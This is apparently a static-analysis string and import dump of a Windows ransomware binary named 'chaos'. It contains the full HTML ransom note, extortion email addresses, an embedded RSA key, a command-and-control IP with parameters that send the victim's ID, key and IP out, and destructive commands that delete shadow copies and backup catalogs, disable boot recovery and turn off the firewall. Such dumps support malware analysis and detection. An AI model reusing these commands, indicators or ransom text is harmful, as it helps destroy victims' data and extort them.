Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0xb7000 0x00401000  0xb7000 -r-x .text
1   0x000b7400  0x2f600 0x004b8000  0x30000 -r-- .rdata
2   0x000e6a00   0x6e00 0x004e8000   0xa000 -rw- .data
3   0x000ed800    0x200 0x004f2000   0x1000 -r-- .rsrc
4   0x000eda00   0xbe00 0x004f3000   0xc000 -r-- .reloc

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x0046cd88 paddr=0x0006c188 haddr=0x00000138 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Main]
vaddr=0x00415850 paddr=0x00014c50
[Imports]
nth vaddr      bind type lib          name
1754 0x000cb0e4 0x004cbce4 5    12   .rdata  utf16le zh-hk
1755 0x000cb0f0 0x004cbcf0 5    12   .rdata  utf16le zh-mo
1756 0x000cb0fc 0x004cbcfc 5    12   .rdata  utf16le zh-sg
1757 0x000cb108 0x004cbd08 5    12   .rdata  utf16le zh-tw
1758 0x000cb114 0x004cbd14 5    12   .rdata  utf16le zu-za
1759 0x000cb124 0x004cbd24 5    6    .rdata  ascii   1#INF
1760 0x000cb12c 0x004cbd2c 6    7    .rdata  ascii   1#QNAN
1761 0x000cb134 0x004cbd34 6    7    .rdata  ascii   1#SNAN
1762 0x000cb13c 0x004cbd3c 5    6    .rdata  ascii   1#IND
1763 0x000cb187 0x004cbd87 5    7    .rdata  utf8    ?0gǓW blocks=Basic Latin,Latin Extended-B
1764 0x000cb219 0x004cbe19 5    6    .rdata  ascii   UUUUU
1765 0x000cb252 0x004cbe52 6    8    .rdata  utf8    g5RҌ<t blocks=Basic Latin,Cyrillic
1766 0x000cb266 0x004cbe66 4    6    .rdata  utf8    `<țu blocks=Basic Latin,Latin Extended-B
1767 0x000cb280 0x004cbe80 4    6    .rdata  utf8    ќ/p= blocks=Cyrillic,Basic Latin
1768 0x000cb2a3 0x004cbea3 4    6    .rdata  utf8    &TŤ< blocks=Basic Latin,Latin Extended-A
1769 0x000cb2b1 0x004cbeb1 5    6    .rdata  ascii   ?RbSQ
1770 0x000cb2b7 0x004cbeb7 5    6    .rdata  ascii   <zQ}<
1771 0x000cb2d0 0x004cbed0 4    5    .rdata  ascii   _/:>
1772 0x000cb2e1 0x004cbee1 4    6    .rdata  utf8    æDAo blocks=Latin-1 Supplement,Basic Latin
1773 0x000cb2f7 0x004cbef7 7    8    .rdata  ascii   <8bunz8
1774 0x000cb343 0x004cbf43 4    6    .rdata  utf8    ]9ݏ< blocks=Basic Latin,Syriac
1775 0x000cb357 0x004cbf57 4    6    .rdata  utf8    <ʩ:7 blocks=Basic Latin,IPA Extensions
1776 0x000cb363 0x004cbf63 4    6    .rdata  utf8    s)ҧ< blocks=Basic Latin,Cyrillic
1777 0x000cb395 0x004cbf95 4    5    .rdata  ascii   cC<-
1778 0x000cb39a 0x004cbf9a 4    5    .rdata  ascii   a`\bN
1779 0x000cb3b4 0x004cbfb4 6    8    .rdata  utf8    ΐv<'*6 blocks=Greek and Coptic,Basic Latin
1780 0x000cb3f7 0x004cbff7 4    5    .rdata  ascii   <)TH
1781 0x000cb427 0x004cc027 4    5    .rdata  ascii   <$"U
1782 0x000cb486 0x004cc086 4    5    .rdata  ascii   e<bN
1783 0x000cb4b7 0x004cc0b7 4    6    .rdata  utf8    <۠*B blocks=Basic Latin,Arabic
1784 0x000cb4c6 0x004cc0c6 4    5    .rdata  ascii   {<6w
1785 0x000cb4da 0x004cc0da 4    6    .rdata  utf8    Ͱ77\t blocks=Greek and Coptic,Basic Latin
1786 0x000cb4e7 0x004cc0e7 4    6    .rdata  utf8    <ONޟ blocks=Basic Latin,Thaana
1787 0x000cb50a 0x004cc10a 5    6    .rdata  ascii   ]{f\f\n
1788 0x000cb517 0x004cc117 4    5    .rdata  ascii   <\%>
1789 0x000cb593 0x004cc193 6    7    .rdata  ascii   l,kg<i
1790 0x000cb5aa 0x004cc1aa 5    6    .rdata  ascii   \aJ-\a\r
1791 0x000cb605 0x004cc205 5    7    .rdata  utf8    Î<'Za blocks=Latin-1 Supplement,Basic Latin
1792 0x000cb617 0x004cc217 7    8    .rdata  ascii   <@En[vP
1793 0x000cb630 0x004cc230 7    16   .rdata  utf16le CONOUT$
1794 0x000cb640 0x004cc240 5    6    .rdata  ascii   log10
1795 0x000cb794 0x004cc394 4    5    .rdata  ascii   lzZ?
1796 0x000cb7cc 0x004cc3cc 4    5    .rdata  ascii   \tk8=
1797 0x000cb7fb 0x004cc3fb 5    6    .rdata  ascii   \tQ*\e=
1798 0x000cb80c 0x004cc40c 4    5    .rdata  ascii   b6\b=
1799 0x000cb8a3 0x004cc4a3 4    6    .rdata  utf8    N\vָ? blocks=Basic Latin,Hebrew
1800 0x000cb8b7 0x004cc4b7 6    7    .rdata  ascii   ?5Wg4p
1801 0x000cb8c9 0x004cc4c9 4    5    .rdata  ascii   Nv$^
1802 0x000cb901 0x004cc501 4    6    .rdata  utf8     <śm blocks=Basic Latin,Latin Extended-A
1803 0x000cb939 0x004cc539 4    5    .rdata  ascii   w(@\t
1804 0x000cb97b 0x004cc57b 5    6    .rdata  ascii   BC .=
1805 0x000cb999 0x004cc599 4    5    .rdata  ascii   a>-\e
1806 0x000cb9b2 0x004cc5b2 4    5    .rdata  ascii   (lX 
1807 0x000cba7c 0x004cc67c 4    5    .rdata  ascii   #{ =
1808 0x000cba81 0x004cc681 4    5    .rdata  ascii   `~R=
1809 0x000cbabc 0x004cc6bc 4    5    .rdata  ascii   }s"=
1810 0x000cbac2 0x004cc6c2 4    5    .rdata  ascii   \tE[\n
1811 0x000cbac9 0x004cc6c9 5    6    .rdata  ascii   %S#[k
1812 0x000cbb11 0x004cc711 4    6    .rdata  utf8    x¾/@ blocks=Basic Latin,Latin-1 Supplement
1813 0x000cbb1a 0x004cc71a 6    7    .rdata  ascii   "B <1=
1814 0x000cbb29 0x004cc729 4    5    .rdata  ascii   \-!y
1815 0x000cbb4a 0x004cc74a 6    7    .rdata  ascii   \f#.X'=
1816 0x000cbb7c 0x004cc77c 4    5    .rdata  ascii   i9+=
1817 0x000cbfbf 0x004ccbbf 4    5    .rdata  ascii   ?pAM
1818 0x000cbfe8 0x004ccbe8 17   18   .rdata  ascii   Unknown exception
1819 0x000cbffc 0x004ccbfc 8    9    .rdata  ascii   bad cast
1820 0x000cc008 0x004ccc08 15   16   .rdata  ascii   bad locale name
1821 0x000cc018 0x004ccc18 5    6    .rdata  ascii   false
1822 0x000cc020 0x004ccc20 4    5    .rdata  ascii   true
1823 0x000cc02c 0x004ccc2c 7    8    .rdata  ascii   generic
1824 0x000cc034 0x004ccc34 8    9    .rdata  ascii   iostream
1825 0x000cc040 0x004ccc40 21   22   .rdata  ascii   iostream stream error
1826 0x000cc058 0x004ccc58 6    7    .rdata  ascii   system
1827 0x000cc060 0x004ccc60 13   14   .rdata  ascii   unknown error
1828 0x000cc070 0x004ccc70 20   21   .rdata  ascii   ios_base::badbit set
1829 0x000cc088 0x004ccc88 21   22   .rdata  ascii   ios_base::failbit set
1830 0x000cc0a0 0x004ccca0 20   21   .rdata  ascii   ios_base::eofbit set
1831 0x000cc0c8 0x004cccc8 4    5    .rdata  ascii   ", "
1832 0x000cc0d0 0x004cccd0 6    7    .rdata  ascii   exists
1833 0x000cc0d8 0x004cccd8 9    10   .rdata  ascii   file_size
1834 0x000cc0e4 0x004ccce4 6    7    .rdata  ascii   remove
1835 0x000cc0ec 0x004cccec 5    6    .rdata  ascii   space
1836 0x000cc0f4 0x004cccf4 6    7    .rdata  ascii   status
1837 0x000cc0fc 0x004cccfc 16   17   .rdata  ascii   create_directory
1838 0x000cc114 0x004ccd14 23   24   .rdata  ascii   ', trying to retrieve '
1839 0x000cc12c 0x004ccd2c 11   12   .rdata  ascii   ', stored '
1840 0x000cc138 0x004ccd38 35   36   .rdata  ascii   NameValuePairs: type mismatch for '
1841 0x000cc15c 0x004ccd5c 31   32   .rdata  ascii   Clone() is not implemented yet.
1842 0x000cc17c 0x004ccd7c 7    8    .rdata  ascii   unknown
1843 0x000cc188 0x004ccd88 47   48   .rdata  ascii   : this object doesn't support resynchronization
1844 0x000cc1b8 0x004ccdb8 63   64   .rdata  ascii   StreamTransformation: this object doesn't support random access
1845 0x000cc1f8 0x004ccdf8 57   58   .rdata  ascii   RandomNumberGenerator: IncorporateEntropy not implemented
1846 0x000cc234 0x004cce34 53   54   .rdata  ascii   BufferedTransformation: this object is not attachable
1847 0x000cc26c 0x004cce6c 51   52   .rdata  ascii   CryptoMaterial: this object contains invalid values
1848 0x000cc2a0 0x004ccea0 59   60   .rdata  ascii   CryptoMaterial: this object does not support precomputation
1849 0x000cc2e0 0x004ccee0 80   81   .rdata  ascii   GeneratableCryptoMaterial: this object does not support key/parameter generation
1850 0x000cc338 0x004ccf38 10   11   .rdata  ascii   " not used
1851 0x000cc344 0x004ccf44 36   37   .rdata  ascii   AlgorithmParametersBase: parameter "
1852 0x000cc36c 0x004ccf6c 11   12   .rdata  ascii   InputBuffer
1853 0x000cc378 0x004ccf78 5    6    .rdata  ascii   SHA-1
1854 0x000cc380 0x004ccf80 12   13   .rdata  ascii   FeedbackSize
1855 0x000cc398 0x004ccf98 13   14   .rdata  ascii   InputFileName
1856 0x000cc3a8 0x004ccfa8 17   18   .rdata  ascii   InputFileNameWide
1857 0x000cc3bc 0x004ccfbc 15   16   .rdata  ascii   InputBinaryMode
1858 0x000cc3cc 0x004ccfcc 14   15   .rdata  ascii   OutputFileName
1859 0x000cc3dc 0x004ccfdc 18   19   .rdata  ascii   OutputFileNameWide
1860 0x000cc3f0 0x004ccff0 16   17   .rdata  ascii   OutputBinaryMode
1861 0x000cc404 0x004cd004 18   19   .rdata  ascii   EncodingParameters
1862 0x000cc418 0x004cd018 8    9    .rdata  ascii   Log2Base
1863 0x000cc424 0x004cd024 19   20   .rdata  ascii   DecodingLookupArray
1864 0x000cc438 0x004cd038 16   17   .rdata  ascii   InsertLineBreaks
1865 0x000cc44c 0x004cd04c 13   14   .rdata  ascii   MaxLineLength
1866 0x000cc460 0x004cd060 70   71   .rdata  ascii   CipherModeBase: feedback size cannot be specified for this cipher mode
1867 0x000cc4ac 0x004cd0ac 4    5    .rdata  ascii   /GCM
1868 0x000cc4b4 0x004cd0b4 4    5    .rdata  ascii   MGF1
1869 0x000cc4be 0x004cd0be 11   24   .rdata  utf16le AC:\Windows
1870 0x000cc4d8 0x004cd0d8 12   26   .rdata  utf16le C:\\Windows\
1871 0x000cc50c 0x004cd10c 49   50   .rdata  ascii                                                    
1872 0x000cc544 0x004cd144 26   27   .rdata  ascii   Unhandled exception caught
1873 0x000cc570 0x004cd170 4    5    .rdata  ascii   fuck
1874 0x000cc580 0x004cd180 8    18   .rdata  utf16le bkey.txt
1875 0x000cc594 0x004cd194 7    16   .rdata  utf16le IDo.txt
1876 0x000cc5a4 0x004cd1a4 15   32   .rdata  utf16le Decryption-Info
1877 0x000cc5c4 0x004cd1c4 4    10   .rdata  utf16le shit
1878 0x000cc5d0 0x004cd1d0 7    8    .rdata  ascii   threaad
1879 0x000cc5d8 0x004cd1d8 13   14   .rdata  ascii   sqlserver.exe
1880 0x000cc5e8 0x004cd1e8 12   13   .rdata  ascii   msftesql.exe
1881 0x000cc5f8 0x004cd1f8 12   13   .rdata  ascii   sqlagent.exe
1882 0x000cc608 0x004cd208 14   15   .rdata  ascii   sqlbrowser.exe
1883 0x000cc618 0x004cd218 13   14   .rdata  ascii   sqlwriter.exe
1884 0x000cc628 0x004cd228 10   11   .rdata  ascii   mysqld.exe
1885 0x000cc634 0x004cd234 13   14   .rdata  ascii   mysqld-nt.exe
1886 0x000cc644 0x004cd244 14   15   .rdata  ascii   mysqld-opt.exe
1887 0x000cc654 0x004cd254 20   42   .rdata  utf16le \Decryption-Info.HTA
1888 0x000cc680 0x004cd280 5    6    .rdata  ascii   error
1889 0x000cc690 0x004cd290 36   37   .rdata  ascii   0123456789QWERTYUIOPASDFGHJKLZXCVBNM
1890 0x000cc6b8 0x004cd2b8 88   89   .rdata  ascii   0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
1891 0x000cc714 0x004cd314 6    7    .rdata  ascii   active
1892 0x000cc71c 0x004cd31c 6    7    .rdata  ascii   detive
1893 0x000cc728 0x004cd328 12   13   .rdata  ascii   pastebin.com
1894 0x000cc738 0x004cd338 13   14   .rdata  ascii   /raw/eEpt6UrD
1895 0x000cc748 0x004cd348 65   66   .rdata  ascii   /1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C
1896 0x000cc790 0x004cd390 4    5    .rdata  ascii   From
1897 0x000cc798 0x004cd398 6    7    .rdata  ascii   &mail=
1898 0x000cc7a0 0x004cd3a0 4    5    .rdata  ascii   &id=
1899 0x000cc7a8 0x004cd3a8 5    6    .rdata  ascii   &key=
1900 0x000cc7b0 0x004cd3b0 6    7    .rdata  ascii   &disk=
1901 0x000cc7b8 0x004cd3b8 4    5    .rdata  ascii   &ip=
1902 0x000cc7c4 0x004cd3c4 22   23   .rdata  ascii   C:\ProgramData\IDo.txt
1903 0x000cc7dc 0x004cd3dc 25   26   .rdata  ascii   C:\ProgramData\pubkey.txt
1904 0x000cc7f8 0x004cd3f8 14   15   .rdata  ascii   C:\ProgramData
1905 0x000cc808 0x004cd408 392  393  .rdata  ascii   MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAzA+0svdK/zcghzPRS7F+pPzCjAlygcNhQj/T5g7HigLegVH/Fi2dhjBDxjt9Ly3aPsHpTb32ub2xb3gvv2VcBi4PVOClceG9Pq6M6HlUGYt1yhSRx8v+0CHX9Dg9rA/3SMhlqsVodtHtMbefPnPhto1/QY4FCcS3xGcC97Ja+oDkCVnkES8U1xeHno5kIlIWMulS5pjM6D3hss5yjUjIHiSr06QS4gCLX1ZijMo0wA3y6k9RUm9Me8MYiss/39RzsgGwDv5+DNxkLgSU25Sa2NZ8iG+Vufk/CkWe9CQj/SRCHm/mVQpNlfbthTTGh3OXy36pu46nYv3fS/ulkqHTaQIBEQ==
1906 0x000cca50 0x004cd650 11   12   .rdata  ascii   80.82.69.52
1907 0x000cca5c 0x004cd65c 7    8    .rdata  ascii   /status
1908 0x000cca64 0x004cd664 20   21   .rdata  ascii   Unhandled exception\n
1909 0x000cca7c 0x004cd67c 22   23   .rdata  ascii   DECRPToffice@gmail.com
1910 0x000cca94 0x004cd694 19   40   .rdata  utf16le DECRPT@tutanota.com
1911 0x000ccabc 0x004cd6bc 5    6    .rdata  ascii   .Void
1912 0x000ccac4 0x004cd6c4 18   19   .rdata  ascii   net stop SQLWriter
1913 0x000ccad8 0x004cd6d8 19   20   .rdata  ascii   net stop SQLBrowser
1914 0x000ccaec 0x004cd6ec 20   21   .rdata  ascii   net stop MSSQLSERVER
1915 0x000ccb04 0x004cd704 23   24   .rdata  ascii   net stop MSSQL$CONTOSO1
1916 0x000ccb1c 0x004cd71c 14   15   .rdata  ascii   net stop MSDTC
1917 0x000ccb2c 0x004cd72c 57   58   .rdata  ascii   bcdedit /set {default} bootstatuspolicy ignoreallfailures
1918 0x000ccb68 0x004cd768 41   42   .rdata  ascii   bcdedit /set {default} recoveryenabled no
1919 0x000ccb94 0x004cd794 29   30   .rdata  ascii   wbadmin delete catalog -quiet
1920 0x000ccbb4 0x004cd7b4 23   24   .rdata  ascii   net stop SQLSERVERAGENT
1921 0x000ccbcc 0x004cd7cc 12   13   .rdata  ascii   net stop vds
1922 0x000ccbdc 0x004cd7dc 47   48   .rdata  ascii   netsh advfirewall set  currentprofile state off
1923 0x000ccc0c 0x004cd80c 38   39   .rdata  ascii   netsh firewall set opmode mode=disable
1924 0x000ccc34 0x004cd834 21   44   .rdata  utf16le  </div></body></html>
1925 0x000ccc60 0x004cd860 31   64   .rdata  utf16le    <br/>In Case Of No Answer : 
1926 0x000ccca0 0x004cd8a0 17   36   .rdata  utf16le <br/>Our Email : 
1927 0x000cccc8 0x004cd8c8 2044 4088 .rdata  utf16le <html><head><meta http-equiv='X-UA-Compatible' content='IE=11' /><script type='text/javascript'>window.resizeTo(window.screen.width,window.screen.height);</script><style>body {            background-color: #f7f5ff;             text-align: center;        }      #h1{text-shadow: -2px -2px #a2faf6;          color: black;          transition: font-size 1s;      }        #h1:hover{      font-size: 50px;        }        #d1{            background-color: #a9e4e9;  width: 93%;            height: 190px;            margin: auto;            text-align: center;            border-radius: 13px;            font-size: 14pt;            padding-top: 10px;            transition: width 1s, height 1s ,font-size  1s;            font-weight: bold;        }        #d2{            background-color: #a9e4e9;            width: 93%;            height: 150px;            margin: auto;            margin-top: 16px;            text-align: center;            border-radius: 13px;            font-size: 14pt;            padding-top: 10px;            transition: width 1s, height 1s ,font-size  1s;            font-weight: bold;        }        #d1:hover{            box-shadow:-4px -4px 10px black;            height: 190px;            width: 95%;            font-size: 15pt;        }        #d2:hover{            box-shadow:-4px -4px 10px black;            height: 170px;            width: 95%;            font-size: 15pt;        }        #d3{            background-color: #a9e4e9;            width: 93%;            height: 90px;            margin: auto;            margin-top: 10px;            text-align: center;            border-radius: 13px;            font-size: 14pt;            padding-top: 10px;            transition: width 1s, height 1s ,font-size  1s;            font-weight: bold;        }        #d3:hover{            box-shadow:-4px -4px 10px black;            height: 100px;            width: 95%;            font-size: 15pt;        }    </style>    <title>ENCRYPTED</title></head><body><img src='https://i.ibb.co/2PXVhhm/1.png' height='90px' width
1928 0x000cdcc0 0x004ce8c0 922  1846 .rdata  utf16le ='90px'/><h1 id='h1'>Your Files has Been Encrypted</h1><div id='d1'>Your Files Has Been Encrypted with AES + RSA Algorithm <br/> If You Need Your Files You Have To Pay Decryption Price <br/> You can Send Some Little Files Less Than 1MB for Test (The Test Files Should not Contain valuable Data Like Databases Large Excel Sheets or Backups <br/> After 48 Hour Decryption Price Will be Doubled so You Better Contact us Before Times Up<br> Using Recovery Tools or 3rd Party Application May cause Damage To Your Files And increase price </div><div id='d2'>The Steps You Should Do To Get Your Files Back: <br>1- Contact Email on Files And Send ID on The Files Then Do agreement on a Price</br>2- Send Some Files for Decryption Test ( Dont Pay to Anyone Else who is Not Able to Decrypt Your Test Files!) <br>After Geting Test Files Pay The price in Bitcoin And Get Decryption Tool + RSA key</br></div><div id='d3'>Your Case ID :
1929 0x000ce3f8 0x004ceff8 16   17   .rdata  ascii   threaaaaaaaaaads
1930 0x000ce40c 0x004cf00c 36   37   .rdata  ascii   C:\Program Files\Decryption-Info.HTA
1931 0x000ce434 0x004cf034 28   29   .rdata  ascii   vssadmin delete shadows /all
1932 0x000ce454 0x004cf054 19   20   .rdata  ascii   OutputStringPointer
1933 0x000ce468 0x004cf068 45   46   .rdata  ascii   StringSink: OutputStringPointer not specified
1934 0x000ce498 0x004cf098 69   70   .rdata  ascii   Unflushable<T>: this object has buffered input that cannot be flushed
1935 0x000ce4f4 0x004cf0f4 55   56   .rdata  ascii   BufferedTransformation: this object doesn't allow input
1936 0x000ce52c 0x004cf12c 18   19   .rdata  ascii   vector<T> too long
1937 0x000ce55c 0x004cf15c 58   59   .rdata  ascii   AllocatorBase: requested size would cause integer overflow
1938 0x000ce598 0x004cf198 23   24   .rdata  ascii   invalid string position
1939 0x000ce5b0 0x004cf1b0 15   16   .rdata  ascii   string too long
1940 0x000cf434 0x004d0034 4    9    .rdata  utf16le 8MLM
1941 0x000d7e78 0x004d8a78 6    7    .rdata  ascii   RSDSD6
1942 0x000d7e87 0x004d8a87 4    6    .rdata  utf8    7X\Ÿ blocks=Basic Latin,Latin Extended-A
1943 0x000d7e90 0x004d8a90 29   30   .rdata  ascii   D:\yo\chaos\Release\chaos.pdb
1944 0x000d7ec4 0x004d8ac4 4    5    .rdata  ascii   GCTL
1945 0x000d7ed0 0x004d8ad0 8    9    .rdata  ascii   .text$di
1946 0x000d7ee4 0x004d8ae4 8    9    .rdata  ascii   .text$mn
1947 0x000d7ef8 0x004d8af8 7    8    .rdata  ascii   .text$x
1948 0x000d7f08 0x004d8b08 8    9    .rdata  ascii   .text$yd
1949 0x000d7f1c 0x004d8b1c 8    9    .rdata  ascii   .idata$5
1950 0x000d7f30 0x004d8b30 6    7    .rdata  ascii   .00cfg
1951 0x000d7f40 0x004d8b40 8    9    .rdata  ascii   .CRT$XCA
1952 0x000d7f54 0x004d8b54 9    10   .rdata  ascii   .CRT$XCAA
1953 0x000d7f68 0x004d8b68 8    9    .rdata  ascii   .CRT$XCC
1954 0x000d7f7c 0x004d8b7c 8    9    .rdata  ascii   .CRT$XCL
1955 0x000d7f90 0x004d8b90 8    9    .rdata  ascii   .CRT$XCU
1956 0x000d7fa4 0x004d8ba4 8    9    .rdata  ascii   .CRT$XCZ
1957 0x000d7fb8 0x004d8bb8 8    9    .rdata  ascii   .CRT$XIA
1958 0x000d7fcc 0x004d8bcc 9    10   .rdata  ascii   .CRT$XIAA
1959 0x000d7fe0 0x004d8be0 9    10   .rdata  ascii   .CRT$XIAC
1960 0x000d7ff4 0x004d8bf4 8    9    .rdata  ascii   .CRT$XIC
1961 0x000d8008 0x004d8c08 8    9    .rdata  ascii   .CRT$XIZ
1962 0x000d801c 0x004d8c1c 8    9    .rdata  ascii   .CRT$XLA
1963 0x000d8030 0x004d8c30 8    9    .rdata  ascii   .CRT$XLZ
1964 0x000d8044 0x004d8c44 8    9    .rdata  ascii   .CRT$XPA
1965 0x000d8058 0x004d8c58 8    9    .rdata  ascii   .CRT$XPB
1966 0x000d806c 0x004d8c6c 8    9    .rdata  ascii   .CRT$XPX
1967 0x000d8080 0x004d8c80 9    10   .rdata  ascii   .CRT$XPXA
1968 0x000d8094 0x004d8c94 8    9    .rdata  ascii   .CRT$XPZ
1969 0x000d80a8 0x004d8ca8 8    9    .rdata  ascii   .CRT$XTA
1970 0x000d80bc 0x004d8cbc 8    9    .rdata  ascii   .CRT$XTZ
1971 0x000d80d0 0x004d8cd0 6    7    .rdata  ascii   .rdata
1972 0x000d80e0 0x004d8ce0 8    9    .rdata  ascii   .rdata$T
1973 0x000d80f4 0x004d8cf4 8    9    .rdata  ascii   .rdata$r
1974 0x000d8108 0x004d8d08 13   14   .rdata  ascii   .rdata$sxdata
1975 0x000d8120 0x004d8d20 13   14   .rdata  ascii   .rdata$zzzdbg
1976 0x000d8138 0x004d8d38 8    9    .rdata  ascii   .rtc$IAA
1977 0x000d814c 0x004d8d4c 8    9    .rdata  ascii   .rtc$IZZ
1978 0x000d8160 0x004d8d60 8    9    .rdata  ascii   .rtc$TAA
1979 0x000d8174 0x004d8d74 8    9    .rdata  ascii   .rtc$TZZ
1980 0x000d8188 0x004d8d88 4    5    .rdata  ascii   .tls
1981 0x000d8198 0x004d8d98 5    6    .rdata  ascii   .tls$
1982 0x000d81a8 0x004d8da8 8    9    .rdata  ascii   .tls$ZZZ
1983 0x000d81bc 0x004d8dbc 8    9    .rdata  ascii   .xdata$x
1984 0x000d81d0 0x004d8dd0 8    9    .rdata  ascii   .idata$2
1985 0x000d81e4 0x004d8de4 8    9    .rdata  ascii   .idata$3
1986 0x000d81f8 0x004d8df8 8    9    .rdata  ascii   .idata$4
1987 0x000d820c 0x004d8e0c 8    9    .rdata  ascii   .idata$6
1988 0x000d8220 0x004d8e20 5    6    .rdata  ascii   .data
1989 0x000d8230 0x004d8e30 7    8    .rdata  ascii   .data$r
1990 0x000d8240 0x004d8e40 4    5    .rdata  ascii   .bss
1991 0x000d8250 0x004d8e50 8    9    .rdata  ascii   .rsrc$01
1992 0x000d8264 0x004d8e64 8    9    .rdata  ascii   .rsrc$02
1993 0x000e5daa 0x004e69aa 16   17   .rdata  ascii   GetLogicalDrives
1994 0x000e5dbe 0x004e69be 14   15   .rdata  ascii   FindFirstFileW
1995 0x000e5dd0 0x004e69d0 14   15   .rdata  ascii   Process32First
1996 0x000e5de2 0x004e69e2 13   14   .rdata  ascii   FindNextFileW
1997 0x000e5df2 0x004e69f2 16   17   .rdata  ascii   TerminateProcess
1998 0x000e5e06 0x004e6a06 13   14   .rdata  ascii   GetDriveTypeA
1999 0x000e5e16 0x004e6a16 9    10   .rdata  ascii   FindClose
2000 0x000e5e22 0x004e6a22 11   12   .rdata  ascii   OpenProcess
2001 0x000e5e30 0x004e6a30 24   25   .rdata  ascii   CreateToolhelp32Snapshot
2002 0x000e5e4c 0x004e6a4c 13   14   .rdata  ascii   Process32Next
2003 0x000e5e5c 0x004e6a5c 11   12   .rdata  ascii   CloseHandle
2004 0x000e5e6a 0x004e6a6a 11   12   .rdata  ascii   FreeConsole
2005 0x000e5e78 0x004e6a78 8    9    .rdata  ascii   lstrcmpW
2006 0x000e5e84 0x004e6a84 12   13   .rdata  ascii   GetLastError
2007 0x000e5e94 0x004e6a94 12   13   .rdata  ascii   SetLastError
2008 0x000e5ea4 0x004e6aa4 23   24   .rdata  ascii   QueryPerformanceCounter
2009 0x000e5ebe 0x004e6abe 25   26   .rdata  ascii   QueryPerformanceFrequency
2010 0x000e5eda 0x004e6ada 16   17   .rdata  ascii   GetCurrentThread
2011 0x000e5eee 0x004e6aee 14   15   .rdata  ascii   GetThreadTimes
2012 0x000e5efe 0x004e6afe 12   13   .rdata  ascii   KERNEL32.dll
2013 0x000e5f0e 0x004e6b0e 20   21   .rdata  ascii   CryptAcquireContextA
2014 0x000e5f26 0x004e6b26 19   20   .rdata  ascii   CryptReleaseContext
2015 0x000e5f3c 0x004e6b3c 14   15   .rdata  ascii   CryptGenRandom
2016 0x000e5f4c 0x004e6b4c 12   13   .rdata  ascii   ADVAPI32.dll
2017 0x000e5f5c 0x004e6b5c 11   12   .rdata  ascii   getaddrinfo
2018 0x000e5f6a 0x004e6b6a 12   13   .rdata  ascii   freeaddrinfo
2019 0x000e5f78 0x004e6b78 10   11   .rdata  ascii   WS2_32.dll
2020 0x000e5f86 0x004e6b86 19   20   .rdata  ascii   MultiByteToWideChar
2021 0x000e5f9c 0x004e6b9c 16   17   .rdata  ascii   CreateDirectoryW
2022 0x000e5fb0 0x004e6bb0 11   12   .rdata  ascii   CreateFileW
2023 0x000e5fbe 0x004e6bbe 11   12   .rdata  ascii   DeleteFileW
2024 0x000e5fcc 0x004e6bcc 16   17   .rdata  ascii   FindFirstFileExW
2025 0x000e5fe0 0x004e6be0 19   20   .rdata  ascii   GetDiskFreeSpaceExW
2026 0x000e5ff6 0x004e6bf6 20   21   .rdata  ascii   GetFileAttributesExW
2027 0x000e600e 0x004e6c0e 26   27   .rdata  ascii   GetFileInformationByHandle
2028 0x000e602c 0x004e6c2c 16   17   .rdata  ascii   RemoveDirectoryW
2029 0x000e6040 0x004e6c40 15   16   .rdata  ascii   AreFileApisANSI
2030 0x000e6052 0x004e6c52 16   17   .rdata  ascii   GetModuleHandleW
2031 0x000e6066 0x004e6c66 14   15   .rdata  ascii   GetProcAddress
2032 0x000e6078 0x004e6c78 11   12   .rdata  ascii   MoveFileExW
2033 0x000e6086 0x004e6c86 19   20   .rdata  ascii   WideCharToMultiByte
2034 0x000e609c 0x004e6c9c 14   15   .rdata  ascii   FormatMessageW
2035 0x000e60ae 0x004e6cae 14   15   .rdata  ascii   GetStringTypeW
2036 0x000e60c0 0x004e6cc0 20   21   .rdata  ascii   EnterCriticalSection
2037 0x000e60d8 0x004e6cd8 20   21   .rdata  ascii   LeaveCriticalSection
2038 0x000e60f0 0x004e6cf0 23   24   .rdata  ascii   TryEnterCriticalSection
2039 0x000e610a 0x004e6d0a 21   22   .rdata  ascii   DeleteCriticalSection
2040 0x000e6122 0x004e6d22 18   19   .rdata  ascii   GetCurrentThreadId
